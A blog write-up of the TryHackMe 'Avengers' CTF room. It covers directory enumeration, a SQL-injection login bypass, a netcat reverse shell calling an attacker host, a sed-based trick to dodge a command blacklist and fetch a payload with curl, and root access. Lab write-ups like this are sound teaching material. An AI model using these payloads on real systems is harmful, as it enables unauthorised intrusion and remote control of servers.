---
layout: post
title:  Avengers Writeup
description: A fun CTF-like box with an easter egg and cool (unintended) foothold. I root this box in a quite unique way, which the author of the box certainly did not intend.
date:   2021-01-21 
image:  '/images/avengers.png'
tags:   [SQLi, RCE, Bash Injection]
---

**This report can be read both on this site, and as its <a href = "https://0xd4y.com/reports/Avengers%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**

This was an interesting room from TryHackMe that taught basic SQLi injection. It was structured in a CTF format in which the student would achieve each flag from solving a task (more on this later). Although this box was structured in a way to guide the student, I like to try to complete the box without the hints provided by the questions, and rather than taking you through how to complete each task in sequential order as the author intended, I will explain how I went through this box. As a result, I went the extra mile when completing this box without realizing it! After completing this box, I read many write ups but not one mentioned the secret flag, and more interestingly, no write ups rooted the box (I only found out later that the author of this box did not intend for the student to root the box \[perhaps the author did not realize how the RCE vulnerability could be exploited\]). We will explore this more in detail further in this writeup.

As usual we will enumerate the machine with nmap -sC -sV -oA nmap/nmap <victim ip>. This may take a while so I have already ran it...ok I'm not ippsec. Anyways, looking at the results we see the following:

![](/reports/Avengers/image14.png)

Right off the bat we know this machine is running Ubuntu. All the services are up to date (during the time of writing which is Jan 2021).

Let's take a look at the http server!

Looking at the root page, we see a lot of comments by many avengers, but one in particular stands out:

![](/reports/Avengers/image13.png)

Now this is an interesting comment that should be kept in mind. Before I started playing around with this website, I enumerated the directories of this http-server with gobuster (always have some kind of enum going on in the background).

gobuster dir -u http://<victim ip> -w <wordlist> -o <output\_file>

I highly recommend checking out https://github.com/danielmiessler/SecLists , as there are a lot of useful wordlists that you can use to bruteforce directories, passwords, and usernames. For this box I used the raft-small-words.txt wordlist.

While enumerating the directories, I looked at the source code for this html page and saw the following at the bottom:

![](/reports/Avengers/image2.png)

Clicking on this script, we get the first flag. As a habit, you should look at the html source code, as it might leak some valuable information.

Looking at the gobuster results we see that /portal is an interesting directory. Going to this page we see the following:

![](/reports/Avengers/image15.png)

Looking at the html source code (see a pattern here?) we see an interesting comment:

![](/reports/Avengers/image4.png)

SQLi stands for SQL injection and is a common problem that can have disastrous results in web servers. Thankfully, this vulnerability has been getting more publicized, and the frequency of successful attacks related to SQLi are decreasing.

Typing ‘ OR 1=1-- - in the username and password, we get in!

![](/reports/Avengers/image1.png)

So...the developer though it would be a good idea to allow users to directly interact with the server through commands? Too easy, let’s try an easy reverse shell using pentestmonkey ([http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://www.google.com/url?q=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&sa=D&source=editors&ust=1653956340026229&usg=AOvVaw0wtnc8W3CDqlI9_pZsUQ9E))

On the attacker machine:

nc -lvnp <attacker port>

On the Jarvis command line:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f

Unfortunately, when we run this we receive an error message:

![](/reports/Avengers/image16.png)

So let’s just stick with harmless commands such as ls and cd so that we look around the files of this server. Let’s see which files are in the directory we are in.

Jarvis command:

ls

Results:

create.sql

node\_modules

package-lock.json

package.json

server.js

views

Jarvis command:

cd ..;ls

Results:

avengers

flag5.txt

After looking around we find the fifth flag (at this point I guessed I was supposed to find at least four flags by now). Cool, let’s see the contents.

cat ../flag5.txt

And we get hit with the same “Command disallowed” error that we got when we tried creating a reverse shell. I immediately started thinking of commands similar to cat such as head and tail, but neither worked. Eventually, I tried less which successfully revealed the contents of the fifth flag.

Now at this point, I didn’t know that I wasn’t supposed to go any further so I kept thinking of ways on how I would get a reverse shell. I tried many commands such as curl, bash, nc, perl, python, and many more commands. I was thinking about how it was possible to get a reverse shell without specifically typing any of these blacklisted strings. I came to the conclusion that if I could echo a string to a text file, and then somehow prepend text to it, then I could create a file that would contain a malicious command. Here is the methodology:

echo ‘url <attacker ip>/rev -o /tmp/reverse\_shell’ > /tmp/malicious\_command

sed -i '1s/^/cu/' /tmp/test     ← prepends the characters cu to /tmp/malicious\_command

chmod +x /tmp/malicious\_command

Content of /tmp/malicious\_command:

curl <attacker ip>/rev -o /tmp/rev

Then, executing /tmp/rev would call the curl command make our malicious file be downloaded to the /tmp directory.

Let’s try this out!

less /tmp/malicious\_command

![](/reports/Avengers/image9.png)

Awesome! Let’s set up a python http server on port 80 with a file called rev. This file can now hold the blacklist nc string as it is not being written to the Jarvis Command Line.

You can try many different reverse shells but I find this particular one to be the most reliable:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f

Running sudo python3 -m http.server 80 and executing /tmp/malicious\_command we get a hit!

Looking at the content of /tmp we see these files now:

![](/reports/Avengers/image17.png)

Now on our machine let’s listen to the port that we specified in the reverse shell command.

Jarvis commands:

chmod +x /tmp/rev; /tmp/rev

And we get a reverse shell!

![](/reports/Avengers/image3.png)

No need to privesc! We are already root because the server was running as root! Now this is a huge vulnerability that is not too uncommon. NEVER RUN YOUR WEB SERVERS AS ROOT! It is better to run a web server as a low-privileged user such as www-data in case of any web vulnerabilities. So anyways, now that we have root I’d call the box done. Let’s just get the flags straight from the terminal.

find / 2>/dev/null|grep -i flag|grep -i .txt

![](/reports/Avengers/image11.png)

grep -r flag2 /home

![](/reports/Avengers/image12.png)

For task 6 view the html source code and scroll to the bottom. On the very left side of the screen is the number of lines of code.

![](/reports/Avengers/image6.png)

So these are all the flags that the author wanted us to find when he published the room, but let’s find the secret flag (something I stumbled on accidentally). I was curious on looking at the source code of the Jarvis command line to see which strings in particular are blacklisted. We strike a goldmine in /home/ubuntu/avengers/server.js

![](/reports/Avengers/image5.png)

Now that explains why a lot of the commands we wanted did not work. Let’s see what else this file has to offer:

![](/reports/Avengers/image10.png)

We get credentials to the mysql server of this box! Now that saves a lot of time trying to reset the credentials. Let’s check it out.

![](/reports/Avengers/image8.png)

![](/reports/Avengers/image7.png)

And we get the secret flag!

flag4:sanitize\_queries\_mr\_stark

Looking at the SQL source code of the site (also located in /home/ubuntu/avengers/server.js) we see why the website was vulnerable to the SQLi.

![](/reports/Avengers/image18.png)

The following line is particularly interesting:

// Made deliberately vulnerable.. Changed from con.query('SELECT \* FROM users WHERE   username = ? AND password = ?', \[username, password\]

                con.query('SELECT \* FROM users WHERE username = ' + username + ' AND password = ' + password, function(error, results, fields) {

When we wrote ‘ OR 1=1-- - , the line looked like this:

con.query('SELECT \* FROM users WHERE username = ''OR 1=1-- - + username + ' AND password = ' + password, function(error, results, fields) {

Note how the rest of the query is commented out using the dashes -- -. Essentially, the server was looking for a person whose username is blank, or true. Now nobody in the http server had a blank name so that would run false. However the OR statement is key! A false statement “ORed” with a true statement makes the statement true as a whole. For this reason, the login query ran true giving us access.

Overall, this was a very fun box with an interesting and unique way of rooting (although I don’t think it was intended). This is my first writeup, and I hope you enjoyed reading it!
